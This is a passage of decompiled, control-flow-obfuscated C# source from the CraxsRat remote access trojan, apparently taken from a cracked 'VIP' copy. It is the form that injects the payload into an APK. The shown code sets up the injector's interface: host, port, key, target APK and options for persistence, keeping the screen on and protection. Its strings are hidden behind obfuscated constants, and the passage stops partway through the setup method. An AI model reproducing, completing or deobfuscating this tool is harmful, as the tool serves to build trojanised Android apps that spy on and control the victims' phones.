// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.Jector
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.My;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class Jector : Form
  {
    public TcpClient Client;
    public Craxs_Rat.sockets.Client classClient;
    public string Title;
    public string ver;
    public int Correntindex;
    public Collection paths_indexs;
    private string FSize;
    private string Q;
    public bool ShowVideo;
    public string DownFolder;
    public Collection DownStreams;
    private string FileDirectory;
    private List<Array> Clipboard;
    private bool isfront;
    private string KEYsx;
    private PictureBox tempImage;
    private List<DataGridViewRow> searchbefore;
    private IContainer components;
    private string TheApkPath;
    private string N__ask_prim_;
    public static byte f0050A3;
    private string N__access_ask_;

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
label_1:
      int num1 = 1622922923;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (~(~((-504676325 ^ -1074791136) * 134044685) - ~(num2 ^ 1579148753 * ~(--121838573 + (1644958613 - 10822899) ^ ~(1127415571 - -1206199176)))) * -676607305 ^ -117358247)) % 405U)
        {
          case 0:
            this.Label5.TabIndex = 9;
            this.Label5.Text = EXGuarder.\u003306D035B;
            this.log.BackColor = Color.Black;
            num1 = (int) num3 * 1640930580 ^ 1342409990;
            continue;
          case 1:
            this.Port.StyleCustomMode = true;
            this.Port.TabIndex = 20;
            num1 = (int) num3 * 1616671075 ^ 1088133603;
            continue;
          case 2:
            this.list_activ.Controls.Add((Control) this.checkonlymain);
            num1 = (int) num3 * -1481865979 ^ -1182941737;
            continue;
          case 3:
            this.CLiname.Size = new Size(228, 32);
            num1 = (int) num3 * 399888846 ^ 987265158;
            continue;
          case 4:
            this.CheckAutomatic = new DrakeUICheckBox();
            num1 = (int) num3 * -387387767 ^ -416695429;
            continue;
          case 5:
            this.PictureBox1.Name = EXGuarder.\u0032E0C5E39;
            num1 = (int) num3 * 1667267170 ^ 575820721;
            continue;
          case 6:
            this.removeactiv.Name = EXGuarder.\u0035E2A015D;
            num1 = (int) num3 * -256853066 ^ 464083541;
            continue;
          case 7:
            this.Label2.Size = new Size(53, 29);
            num1 = (int) num3 * 116847078 ^ -1087651157;
            continue;
          case 8:
            this.ComboPrims.Location = new Point(321, 392);
            this.ComboPrims.Name = EXGuarder.\u00363096107;
            this.ComboPrims.Size = new Size(163, 32);
            num1 = (int) num3 * 748138951 ^ 893870040;
            continue;
          case 9:
            this.checksuper.AutoSize = true;
            num1 = (int) num3 * 374575478 ^ 1745158284;
            continue;
          case 10:
            this.TabPage3.BackColor = Color.Black;
            num1 = (int) num3 * 1769178564 ^ 694652587;
            continue;
          case 11:
            this.Label7.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 598915295 ^ -1877552871;
            continue;
          case 12:
            this.panelactivitys.Controls.Add((Control) this.Activlist);
            this.panelactivitys.Controls.Add((Control) this.Label5);
            num1 = (int) num3 * 1729497462 ^ -1471124678;
            continue;
          case 13:
            this.titletext.Maximum = (double) int.MaxValue;
            num1 = (int) num3 * 150474958 ^ -1889341055;
            continue;
          case 14:
            this.list_activ = new TabPage();
            this.Label6 = new Label();
            num1 = (int) num3 * 28777843 ^ 1931158242;
            continue;
          case 15:
            this.TargetApktext.ReadOnly = true;
            num1 = (int) num3 * -1498346524 ^ 1812324795;
            continue;
          case 16:
            this.msgtext.Style = UIStyle.Custom;
            this.msgtext.StyleCustomMode = true;
            this.msgtext.TabIndex = 45;
            this.msgtext.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num3 * 617517884 ^ 1688974022;
            continue;
          case 17:
            this.Label2.Text = EXGuarder.\u0030A4D2445;
            num1 = (int) num3 * 2032738660 ^ 1263918427;
            continue;
          case 18:
            this.DrakeUIAvatar4.Text = EXGuarder.\u00367050960;
            num1 = (int) num3 * 1032465341 ^ 1526209400;
            continue;
          case 19:
            this.Activlist.RectDisableColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -729083079 ^ 536568022;
            continue;
          case 20:
            this.list_activ.Controls.Add((Control) this.panelactivitys);
            num1 = (int) num3 * 1027664469 ^ -674023044;
            continue;
          case 21:
            this.titletext.TabIndex = 44;
            num1 = (int) num3 * 725674835 ^ -2042230908;
            continue;
          case 22:
            this.DrakeUIAvatar5 = new DrakeUIAvatar();
            this.checkDraw = new CheckBox();
            num1 = (int) num3 * -977852815 ^ 2131869815;
            continue;
          case 23:
            this.Name = EXGuarder.\u0037065363C;
            num1 = (int) num3 * -1730800886 ^ 1450937666;
            continue;
          case 24:
            this.msgtext = new DrakeUITextBox();
            num1 = (int) num3 * 1351811504 ^ 1818679809;
            continue;
          case 25:
            this.CheckAutomatic.TabIndex = 26;
            num1 = (int) num3 * -1439039219 ^ -2146239955;
            continue;
          case 26:
            this.titletext.Margin = new Padding(5, 6, 5, 6);
            num1 = (int) num3 * 1275816242 ^ 1151914346;
            continue;
          case 27:
            this.checkkill.TabIndex = 28;
            num1 = (int) num3 * -1209362214 ^ 1950851320;
            continue;
          case 28:
            this.list_activ.Size = new Size(691, 629);
            num1 = (int) num3 * -372864153 ^ -76004800;
            continue;
          case 29:
            this.Panel5 = new Panel();
            num1 = (int) num3 * 2010876814 ^ 737209419;
            continue;
          case 30:
            this.TabPage4.Controls.Add((Control) this.Button3);
            num1 = (int) num3 * -945679226 ^ -776082265;
            continue;
          case 31:
            this.AutoScaleDimensions = new SizeF(7f, 17f);
            num1 = (int) num3 * -381079086 ^ 459129755;
            continue;
          case 32:
            this.checkonlymain.Font = new Font(EXGuarder.\u0032F541671, 12f);
            this.checkonlymain.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.checkonlymain.Location = new Point(198, 104);
            num1 = (int) num3 * 1329385186 ^ -966218532;
            continue;
          case 33:
            this.maintapcontrols.DrawMode = TabDrawMode.OwnerDrawFixed;
            num1 = (int) num3 * -1267322599 ^ -685065972;
            continue;
          case 34:
            this.Label1.Text = EXGuarder.\u00340082016;
            num1 = (int) num3 * -265780408 ^ 1689083120;
            continue;
          case 35:
            this.TheKey.Style = UIStyle.Custom;
            this.TheKey.StyleCustomMode = true;
            this.TheKey.TabIndex = 21;
            num1 = (int) num3 * -2076619584 ^ -1717663801;
            continue;
          case 36:
            this.ToolTip1.SetToolTip((Control) this.checksuper, EXGuarder.\u003274B1F53);
            num1 = (int) num3 * -1024586255 ^ 2089171353;
            continue;
          case 37:
            this.Label7.Text = EXGuarder.\u00360242928;
            num1 = (int) num3 * 1922418469 ^ -2139601948;
            continue;
          case 38:
            this.list_activ.Controls.Add((Control) this.CheckAutomatic);
            num1 = (int) num3 * 239138996 ^ 209187181;
            continue;
          case 39:
            this.ToolTip1.SetToolTip((Control) this.checkDraw, EXGuarder.\u0034D744638);
            this.checkDraw.UseVisualStyleBackColor = true;
            num1 = (int) num3 * 1465331938 ^ -987033500;
            continue;
          case 40:
            this.msgtext.Location = new Point(56, 268);
            num1 = (int) num3 * 975285772 ^ 373188801;
            continue;
          case 41:
            this.Button1.UseVisualStyleBackColor = true;
            num1 = (int) num3 * 101464117 ^ -1389608091;
            continue;
          case 42:
            this.Activlist.ForeColor = Color.Black;
            this.Activlist.HoverColor = Color.Silver;
            this.Activlist.ItemSelectBackColor = Color.FromArgb(140, 140, 140);
            num1 = (int) num3 * -728417231 ^ 1861886552;
            continue;
          case 43:
            this.removeactiv.TabIndex = 22;
            num1 = (int) num3 * 2090753221 ^ -749752305;
            continue;
          case 44:
            this.maintapcontrols.TabBackColor = Color.Black;
            this.maintapcontrols.TabIndex = 29;
            this.maintapcontrols.TabSelectedColor = Color.FromArgb(21, 21, 21);
            num1 = (int) num3 * -2000259581 ^ -428559901;
            continue;
          case 45:
            this.DrakeWidth_W1.BackColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 34261736 ^ -208883682;
            continue;
          case 46:
            this.panelactivitys.Location = new Point(61, 368);
            this.panelactivitys.Name = EXGuarder.\u0031C650769;
            num1 = (int) num3 * 301398537 ^ 1583894647;
            continue;
          case 47:
            this.Label7.AutoSize = true;
            num1 = (int) num3 * 1880218727 ^ 249900744;
            continue;
          case 48:
            this.titletext.TextAlignment = ContentAlignment.TopCenter;
            this.titletext.Watermark = EXGuarder.\u00375152C26;
            this.Label14.AutoSize = true;
            num1 = (int) num3 * -492079140 ^ -807556527;
            continue;
          case 49:
            this.CLiname.ForeColor = Color.White;
            this.CLiname.Location = new Point(22, 141);
            num1 = (int) num3 * 1289662951 ^ -689541014;
            continue;
          case 50:
            this.autopanel.Location = new Point(0, 0);
            num1 = (int) num3 * -824193717 ^ 166548764;
            continue;
          case 51:
            this.DrakeUIAvatar4.Location = new Point(628, 36);
            num1 = (int) num3 * 773972164 ^ -1474575734;
            continue;
          case 52:
            this.maintapcontrols.Font = new Font(EXGuarder.\u0032F541671, 12f);
            this.maintapcontrols.ItemSize = new Size(87, 125);
            this.maintapcontrols.Location = new Point(0, 0);
            this.maintapcontrols.MenuStyle = UIMenuStyle.Custom;
            this.maintapcontrols.Multiline = true;
            num1 = (int) num3 * -639503418 ^ 1586057102;
            continue;
          case 53:
            this.paneltargetfolder.ResumeLayout(false);
            num1 = (int) num3 * 1866513738 ^ -1886559216;
            continue;
          case 54:
            this.log.Multiline = true;
            num1 = (int) num3 * -555669062 ^ -1660385458;
            continue;
          case 55:
            this.Activlist.Text = EXGuarder.\u0034F0F3E76;
            num1 = (int) num3 * -1762191487 ^ -2129533414;
            continue;
          case 56:
            this.TabPage1.Name = EXGuarder.\u00357643441;
            this.TabPage1.Size = new Size(691, 629);
            this.TabPage1.TabIndex = 0;
            num1 = (int) num3 * 1352695384 ^ 1518380856;
            continue;
          case 57:
            this.checksuper.Location = new Point(403, 165);
            num1 = (int) num3 * 27482415 ^ 1696760333;
            continue;
          case 58:
            this.Label7.Font = new Font(EXGuarder.\u0035E136B3A, 14f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * -93059303 ^ -224720389;
            continue;
          case 59:
            this.Host.Cursor = Cursors.IBeam;
            this.Host.FillColor = Color.Black;
            this.Host.Font = new Font(EXGuarder.\u0032F541671, 12f);
            num1 = (int) num3 * 10388765 ^ -1489629506;
            continue;
          case 60:
            this.Label6.Font = new Font(EXGuarder.\u0032F541671, 13f);
            num1 = (int) num3 * 55888079 ^ 914070592;
            continue;
          case 61:
            this.Label4.Location = new Point(3, 20);
            num1 = (int) num3 * -1998136684 ^ -1583169582;
            continue;
          case 62:
            this.Port.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num3 * -1447282736 ^ 567281097;
            continue;
          case 63:
            this.removeactiv.Size = new Size(104, 34);
            num1 = (int) num3 * 142107150 ^ 1330368999;
            continue;
          case 64:
            this.DrakeUIAvatar4.SymbolSize = 25;
            num1 = (int) num3 * -1541114311 ^ 732781808;
            continue;
          case 65:
            this.titletext.Font = new Font(EXGuarder.\u0032F541671, 12f);
            this.titletext.ForeColor = Color.White;
            num1 = (int) num3 * -2137440570 ^ -1935336653;
            continue;
          case 66:
            this.Host.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num3 * -46554801 ^ -1965618873;
            continue;
          case 67:
            this.checkautoclick.Size = new Size(178, 28);
            this.checkautoclick.TabIndex = 40;
            num1 = (int) num3 * 1567214313 ^ 1538335731;
            continue;
          case 68:
            goto label_1;
          case 69:
            this.titletext.Cursor = Cursors.IBeam;
            num1 = (int) num3 * 560459073 ^ -1214720380;
            continue;
          case 70:
            this.Label4.Text = EXGuarder.\u0034F383334;
            num1 = (int) num3 * 701247419 ^ 1604819752;
            continue;
          case 71:
            this.checkkeepscreen.TabIndex = 46;
            num1 = (int) num3 * -623864675 ^ -2036277314;
            continue;
          case 72:
            this.checkDraw.Font = new Font(EXGuarder.\u0032F541671, 12f, FontStyle.Bold);
            this.checkDraw.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.checkDraw.Location = new Point(403, 267);
            this.checkDraw.Name = EXGuarder.\u003335B5C00;
            num1 = (int) num3 * -1005907284 ^ -1312737877;
            continue;
          case 73:
            this.Panel1.Controls.Add((Control) this.Host);
            this.Panel1.Controls.Add((Control) this.TheKey);
            num1 = (int) num3 * 342546488 ^ 238771960;
            continue;
          case 74:
            this.checkautoclick = new CheckBox();
            this.DrakeUIAvatar6 = new DrakeUIAvatar();
            num1 = (int) num3 * -2127941426 ^ 2020940688;
            continue;
          case 75:
            this.Label6.Enabled = false;
            num1 = (int) num3 * -744375589 ^ 2033913896;
            continue;
          case 76:
            this.CheckAutomatic.Cursor = Cursors.Hand;
            this.CheckAutomatic.Font = new Font(EXGuarder.\u0032F541671, 12f);
            num1 = (int) num3 * 902155539 ^ -846025157;
            continue;
          case 77:
            this.addactiv.Text = EXGuarder.\u00342396221;
            num1 = (int) num3 * -622690100 ^ 1143155638;
            continue;
          case 78:
            this.checkonlymain.Cursor = Cursors.Hand;
            num1 = (int) num3 * -1737778755 ^ 294808743;
            continue;
          case 79:
            this.addactiv.UseVisualStyleBackColor = true;
            this.Label5.AutoSize = true;
            num1 = (int) num3 * 1633937365 ^ -1458828686;
            continue;
          case 80:
            this.Panel1.Controls.Add((Control) this.Label2);
            num1 = (int) num3 * 1917909651 ^ 1691413073;
            continue;
          case 81:
            this.FolderPath.Location = new Point(8, 50);
            num1 = (int) num3 * 47491207 ^ -462138232;
            continue;
          case 82:
            this.maintapcontrols.Name = EXGuarder.\u0030A27591D;
            num1 = (int) num3 * -966417456 ^ -59460481;
            continue;
          case 83:
            this.checkkeepscreen.AutoSize = true;
            this.checkkeepscreen.Font = new Font(EXGuarder.\u0032F541671, 12f, FontStyle.Bold);
            this.checkkeepscreen.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.checkkeepscreen.Location = new Point(403, 301);
            this.checkkeepscreen.Name = EXGuarder.\u0031E775E59;
            this.checkkeepscreen.Size = new Size(166, 28);
            num1 = (int) num3 * 1908510146 ^ 1625761740;
            continue;
          case 84:
            this.Label1 = new Label();
            this.Label2 = new Label();
            num1 = (int) num3 * -11714995 ^ -114383596;
            continue;
          case 85:
            this.Panel5.Controls.Add((Control) this.autopanel);
            num1 = (int) num3 * -464777276 ^ -224754267;
            continue;
          case 86:
            this.TheKey.Minimum = (double) int.MinValue;
            num1 = (int) num3 * -1087129838 ^ -1966930387;
            continue;
          case 87:
            this.PictureBox1.Image = (Image) Craxs_Rat.My.Resources.Resources.LOGO;
            num1 = (int) num3 * 587084053 ^ -270265982;
            continue;
          case 88:
            this.CheckAutomatic.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.CheckAutomatic.Location = new Point(40, 66);
            num1 = (int) num3 * -975289469 ^ 1535864402;
            continue;
          case 89:
            this.Label5.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1992205797 ^ 261815055;
            continue;
          case 90:
            this.ToolTip1.BackColor = Color.Black;
            this.ToolTip1.ForeColor = Color.White;
            this.checkkill.AutoSize = true;
            num1 = (int) num3 * 75387702 ^ -1056142745;
            continue;
          case 91:
            this.log.ForeColor = Color.Lime;
            num1 = (int) num3 * -623718308 ^ 1978804189;
            continue;
          case 92:
            this.log.TabIndex = 12;
            num1 = (int) num3 * -2049199396 ^ 388365960;
            continue;
          case 93:
            this.CLiname.Maximum = (double) int.MaxValue;
            num1 = (int) num3 * 117978593 ^ -674001821;
            continue;
          case 94:
            this.DrakeUIAvatar5.Name = EXGuarder.\u0030B41503C;
            num1 = (int) num3 * -1545043237 ^ -1929754081;
            continue;
          case 95:
            this.maintapcontrols.Alignment = TabAlignment.Left;
            num1 = (int) num3 * -246740017 ^ 1140373218;
            continue;
          case 96:
            this.checkprotector.Cursor = Cursors.Hand;
            num1 = (int) num3 * -1463082503 ^ 403818427;
            continue;
          case 97:
            this.Label12.TabIndex = 35;
            num1 = (int) num3 * -476699426 ^ -1978368953;
            continue;
          case 98:
            this.checkprotector.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.checkprotector.Location = new Point(198, 139);
            num1 = (int) num3 * 1269575958 ^ -397301368;
            continue;
          case 99:
            this.log.Size = new Size(691, 568);
            num1 = (int) num3 * 1160776563 ^ -1661962424;
            continue;
          case 100:
            this.Label12.AutoSize = true;
            num1 = (int) num3 * -1247393285 ^ 2121350954;
            continue;
          case 101:
            this.DrakeUIAvatar5.BackColor = Color.Transparent;
            this.DrakeUIAvatar5.FillColor = Color.Black;
            this.DrakeUIAvatar5.Font = new Font(EXGuarder.\u0032F541671, 12f);
            num1 = (int) num3 * -481557775 ^ -304558982;
            continue;
          case 102:
            this.Button3.FlatStyle = FlatStyle.Flat;
            num1 = (int) num3 * 300303651 ^ -1970518573;
            continue;
          case 103:
            this.ToolTip1.SetToolTip((Control) this.checkkill, EXGuarder.\u0034D744638);
            this.checkkill.UseVisualStyleBackColor = true;
            num1 = (int) num3 * 864053444 ^ -115806329;
            continue;
          case 104:
            this.checkonlymain.TabIndex = 27;
            this.checkonlymain.Text = EXGuarder.\u0032B790007;
            this.CheckAutomatic.CheckBoxColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -725479501 ^ 702175054;
            continue;
          case 105:
            this.checkonlymain.Style = UIStyle.Custom;
            num1 = (int) num3 * 790678335 ^ 1419480308;
            continue;
          case 106:
            this.titletext.Padding = new Padding(7, 6, 7, 6);
            num1 = (int) num3 * -1782165832 ^ -298248566;
            continue;
          case 107:
            this.addactiv = new Button();
            num1 = (int) num3 * -589715380 ^ 1971782517;
            continue;
          case 108:
            this.Label4.TabIndex = 6;
            num1 = (int) num3 * 1971101192 ^ -1012941280;
            continue;
          case 109:
            this.Panel5.Location = new Point(0, 0);
            num1 = (int) num3 * 908859885 ^ -1689835964;
            continue;
          case 110:
            this.Activlist.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -851769485 ^ 1839612973;
            continue;
          case 111:
            this.ToolTip1.SetToolTip((Control) this.DrakeUIAvatar6, EXGuarder.\u003061F621B);
            num1 = (int) num3 * 1514956294 ^ -1383177318;
            continue;
          case 112:
            this.checkkill.Font = new Font(EXGuarder.\u0032F541671, 12f, FontStyle.Bold);
            num1 = (int) num3 * -364464513 ^ -94215723;
            continue;
          case 113:
            this.checkDraw.Size = new Size(169, 28);
            this.checkDraw.TabIndex = 39;
            num1 = (int) num3 * -345593250 ^ -241424686;
            continue;
          case 114:
            this.checksuper.Text = EXGuarder.\u0034E155B1F;
            num1 = (int) num3 * -535174765 ^ -1236268813;
            continue;
          case 115:
            this.Label7.TabIndex = 18;
            num1 = (int) num3 * 1589425341 ^ -1074927046;
            continue;
          case 116:
            this.DrakeUITitlePanel2.StyleCustomMode = true;
            num1 = (int) num3 * 910741061 ^ -2001744434;
            continue;
          case 117:
            this.checkonlymain.Size = new Size(456, 29);
            num1 = (int) num3 * 1424625740 ^ 136356576;
            continue;
          case 118:
            this.DrakeUITitlePanel2 = new DrakeUITitlePanel();
            num1 = (int) num3 * 1907915254 ^ 688792417;
            continue;
          case 119:
            this.Port.Font = new Font(EXGuarder.\u0032F541671, 12f);
            this.Port.ForeColor = Color.White;
            num1 = (int) num3 * -1388287486 ^ -1758385490;
            continue;
          case 120:
            this.TabPage3.ResumeLayout(false);
            this.TabPage3.PerformLayout();
            num1 = (int) num3 * 468403405 ^ -122353919;
            continue;
          case 121:
            this.DrakeWidth_W1.Location = new Point(61, 198);
            this.DrakeWidth_W1.Name = EXGuarder.\u003420F175F;
            num1 = (int) num3 * -127538248 ^ -190542163;
            continue;
          case 122:
            this.ComboPrims.FormattingEnabled = true;
            num1 = (int) num3 * -406260959 ^ 87623629;
            continue;
          case 123:
            this.log.Location = new Point(0, 61);
            num1 = (int) num3 * 1383749017 ^ -1517145267;
            continue;
          case 124:
            this.ComboPrims.ForeColor = Color.White;
            num1 = (int) num3 * -1151357992 ^ -1495620668;
            continue;
          case 125:
            this.removeactiv.Text = EXGuarder.\u0030A64690D;
            this.removeactiv.UseVisualStyleBackColor = true;
            num1 = (int) num3 * 1530448536 ^ -536734288;
            continue;
          case 126:
            this.Label4 = new Label();
            num1 = (int) num3 * -2063207446 ^ 1786045047;
            continue;
          case (uint) sbyte.MaxValue:
            this.msgtext.Name = EXGuarder.\u0033A1B0B46;
            num1 = (int) num3 * 2090426559 ^ 677199964;
            continue;
          case 128:
            this.DrakeUITitlePanel2.Style = UIStyle.Custom;
            num1 = (int) num3 * -344597699 ^ 2111571018;
            continue;
          case 129:
            this.mnulpanel.TabIndex = 0;
            this.autopanel.Dock = DockStyle.Fill;
            num1 = (int) num3 * -1444082975 ^ 1953815661;
            continue;
          case 130:
            this.ComboPrims = new ComboBox();
            num1 = (int) num3 * 640313588 ^ -197068985;
            continue;
          case 131:
            this.Label1.TabIndex = 1;
            num1 = (int) num3 * 396094098 ^ 207872770;
            continue;
          case 132:
            this.CLiname.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.CLiname.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * -712744175 ^ 1421508209;
            continue;
          case 133:
            this.labeltargetapp.Text = EXGuarder.\u003545A6071;
            num1 = (int) num3 * 1663366753 ^ 1338320351;
            continue;
          case 134:
            this.checkprotector.Style = UIStyle.Custom;
            num1 = (int) num3 * -1613862495 ^ 448188606;
            continue;
          case 135:
            this.DrakeWidth_W1 = new DrakeWidth_W();
            this.checkprotector = new DrakeUICheckBox();
            this.panelactivitys = new Panel();
            num1 = (int) num3 * 243469092 ^ 388957073;
            continue;
          case 136:
            this.Label3.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1201398688 ^ 1630987991;
            continue;
          case 137:
            this.DrakeUIAvatar4.Name = EXGuarder.\u00367050960;
            this.DrakeUIAvatar4.Size = new Size(39, 35);
            this.DrakeUIAvatar4.Style = UIStyle.Custom;
            this.DrakeUIAvatar4.StyleCustomMode = true;
            this.DrakeUIAvatar4.Symbol = 61453;
            num1 = (int) num3 * 493478365 ^ -1340024162;
            continue;
          case 138:
            this.titletext.StyleCustomMode = true;
            num1 = (int) num3 * 1156855322 ^ 384375375;
            continue;
          case 139:
            this.list_activ.Controls.Add((Control) this.DrakeWidth_W1);
            this.list_activ.Controls.Add((Control) this.checkprotector);
            num1 = (int) num3 * 1200859042 ^ 1472965773;
            continue;
          case 140:
            this.DrakeUIAvatar6.Font = new Font(EXGuarder.\u0032F541671, 12f);
            this.DrakeUIAvatar6.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -2108939781 ^ 562626170;
            continue;
          case 141:
            this.Panel5.Controls.Add((Control) this.mnulpanel);
            num1 = (int) num3 * -1477330179 ^ 156026529;
            continue;
          case 142:
            this.ShowIcon = false;
            this.Text = EXGuarder.\u003704D3B19;
            this.Panel1.ResumeLayout(false);
            num1 = (int) num3 * -390335041 ^ -1025921;
            continue;
          case 143:
            this.TabPage4.Location = new Point(126, 0);
            num1 = (int) num3 * 1427796393 ^ -209523607;
            continue;
          case 144:
            this.Label6.AutoSize = true;
            num1 = (int) num3 * -805243201 ^ -430066223;
            continue;
          case 145:
            this.Panel1.Controls.Add((Control) this.Label3);
            num1 = (int) num3 * 764201641 ^ 1505064334;
            continue;
          case 146:
            this.paneltargetfolder.Size = new Size(559, 128);
            this.paneltargetfolder.TabIndex = 20;
            num1 = (int) num3 * 1946264039 ^ -1455606030;
            continue;
          case 147:
            this.list_activ.Controls.Add((Control) this.labeltargetapp);
            this.list_activ.Controls.Add((Control) this.TargetApktext);
            num1 = (int) num3 * 1150798074 ^ 1005497425;
            continue;
          case 148:
            this.Label6.Size = new Size(97, 27);
            num1 = (int) num3 * -1966803083 ^ 1046121783;
            continue;
          case 149:
            this.DrakeUIAvatar5.Location = new Point(274, 153);
            num1 = (int) num3 * 1876220346 ^ -1330167826;
            continue;
          case 150:
            this.Port = new DrakeUITextBox();
            num1 = (int) num3 * -648249443 ^ 760845133;
            continue;
          case 151:
            this.checkkill.Size = new Size(156, 28);
            num1 = (int) num3 * 1549016670 ^ 623832043;
            continue;
          case 152:
            this.CheckAutomatic.Name = EXGuarder.\u0034E670079;
            num1 = (int) num3 * 81816875 ^ 1012005363;
            continue;
          case 153:
            this.Panel1.Controls.Add((Control) this.Label7);
            this.Panel1.Controls.Add((Control) this.Label1);
            num1 = (int) num3 * -1105040087 ^ 1493423058;
            continue;
          case 154:
            this.CheckAutomatic.Text = EXGuarder.\u0036210330E;
            this.labeltargetapp.AutoSize = true;
            num1 = (int) num3 * 785545435 ^ 1426482693;
            continue;
          case 155:
            this.msgtext.Padding = new Padding(7, 6, 7, 6);
            num1 = (int) num3 * -1004494868 ^ 1282230421;
            continue;
          case 156:
            this.Button1.Text = EXGuarder.\u003113A5F25;
            num1 = (int) num3 * 657572365 ^ 2046360923;
            continue;
          case 157:
            this.list_activ.PerformLayout();
            this.panelactivitys.ResumeLayout(false);
            this.panelactivitys.PerformLayout();
            num1 = (int) num3 * -1453565885 ^ 1024673136;
            continue;
          case 158:
            this.FolderPath.Size = new Size(536, 32);
            this.FolderPath.TabIndex = 7;
            this.Button1.FlatStyle = FlatStyle.Flat;
            this.Button1.Font = new Font(EXGuarder.\u0032F541671, 9f);
            this.Button1.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Button1.Location = new Point(429, 20);
            this.Button1.Name = EXGuarder.\u0030F150D5E;
            this.Button1.Size = new Size(115, 27);
            this.Button1.TabIndex = 8;
            num1 = (int) num3 * 420084127 ^ -755050951;
            continue;
          case 159:
            this.addactiv.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.addactiv.Location = new Point(452, 19);
            num1 = (int) num3 * 1344362485 ^ 1897537633;
            continue;
          case 160:
            this.TabPage4.Name = EXGuarder.\u003660E6333;
            this.TabPage4.Size = new Size(691, 629);
            num1 = (int) num3 * 200251324 ^ -1779434419;
            continue;
          case 161:
            this.maintapcontrols.Controls.Add((Control) this.TabPage1);
            num1 = (int) num3 * 1842987089 ^ -1151320031;
            continue;
          case 162:
            this.TheKey.ForeColor = Color.White;
            num1 = (int) num3 * -895033709 ^ 1214440442;
            continue;
          case 163:
            this.DrakeUIAvatar4.AvatarSize = 25;
            num1 = (int) num3 * -888638974 ^ 740978523;
            continue;
          case 164:
            this.Label3.AutoSize = true;
            num1 = (int) num3 * 57457419 ^ 91576159;
            continue;
          case 165:
            this.Port.Location = new Point(314, 249);
            this.Port.Margin = new Padding(4, 5, 4, 5);
            this.Port.Maximum = (double) int.MaxValue;
            num1 = (int) num3 * 388562334 ^ 192762196;
            continue;
          case 166:
            this.selectapkbtn.UseVisualStyleBackColor = true;
            num1 = (int) num3 * -926275804 ^ 1110948907;
            continue;
          case 167:
            this.Host.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Host.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.Host.Size = new Size(228, 32);
            this.Host.Style = UIStyle.Custom;
            this.Host.StyleCustomMode = true;
            num1 = (int) num3 * -1310529970 ^ -971044665;
            continue;
          case 168:
            this.TabPage1.Text = EXGuarder.\u00347594D38;
            this.list_activ.BackColor = Color.Black;
            num1 = (int) num3 * 213902787 ^ 1539263478;
            continue;
          case 169:
            this.TargetApktext.Size = new Size(456, 32);
            this.TargetApktext.TabIndex = 24;
            this.selectapkbtn.Enabled = false;
            num1 = (int) num3 * 1276420061 ^ 234514786;
            continue;
          case 170:
            this.checkonlymain.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num3 * 910567181 ^ 1759147737;
            continue;
          case 171:
            this.Button3.Name = EXGuarder.\u003365A553A;
            num1 = (int) num3 * -1664064997 ^ 2107359730;
            continue;
          case 172:
            this.TheKey.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1899797497 ^ -1802540375;
            continue;
          case 173:
            this.checkkill.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1263131927 ^ -2122043322;
            continue;
          case 174:
            this.TabPage4.Text = EXGuarder.\u0036E1A750E;
            num1 = (int) num3 * 82674879 ^ -1754194497;
            continue;
          case 175:
            this.Button1 = new Button();
            num1 = (int) num3 * -1266473040 ^ 782857197;
            continue;
          case 176:
            this.Label3.Font = new Font(EXGuarder.\u0035E136B3A, 14f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * 371716048 ^ 1741366202;
            continue;
          case 177:
            this.Activlist.FillColor = Color.FromArgb(20, 31, 20);
            num1 = (int) num3 * 1148487067 ^ -1462816577;
            continue;
          case 178:
            this.TabPage3.Controls.Add((Control) this.checkkill);
            this.TabPage3.Controls.Add((Control) this.checkkeepscreen);
            this.TabPage3.Controls.Add((Control) this.msgtext);
            this.TabPage3.Controls.Add((Control) this.titletext);
